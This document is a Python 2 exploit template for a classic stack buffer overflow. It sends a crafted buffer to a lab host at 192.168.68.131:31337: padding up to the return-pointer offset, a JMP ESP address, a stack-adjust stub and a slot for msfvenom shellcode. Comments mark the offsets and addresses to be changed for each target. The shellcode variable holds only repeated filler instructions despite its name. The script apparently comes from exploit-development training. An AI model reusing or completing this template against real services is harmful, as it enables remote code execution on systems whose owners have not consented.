#!/usr/bin/python
import socket
import struct

RHOST = "192.168.68.131"
RPORT = 31337  # USE A LESSER-KNOWN PORT...

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024  # THIS WILL NEED TO CHANGE
offset_srp = 146  # THIS WILL NEED TO CHANGE

ptr_jmp_esp = 0x080414C3  # THIS WILL NEED TO CHANGE

sub_esp_10 = "\x83\xec\x10"  # THIS WILL NEED TO CHANGE

# ---------------------------------------------#
#	INSERT SHELLCODE CREATED FROM MSFVENOM	  #
# ---------------------------------------------#
shellcode_calc = ""
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"
shellcode_calc += "\x83\xec\x10\x83\xec\x10\x83\xec\x10"

# --------------------------------------#
#	BUFFER CONSTRUCTION W/ SHELLCODE   #
# --------------------------------------#
buf = ""
buf += "A" * (offset_srp - len(buf))  # PADDING
buf += struct.pack("<I", ptr_jmp_esp)  # SRP OVERWRITE
buf += sub_esp_10  # ESP POINTS HERE
buf += shellcode_calc  # INSERT THE CONSTRUCTED SHELLCODE HERE
buf += "D" * (buf_totlen - len(buf))  # PADDING
buf += "\n"

s.send(bytes(buf))
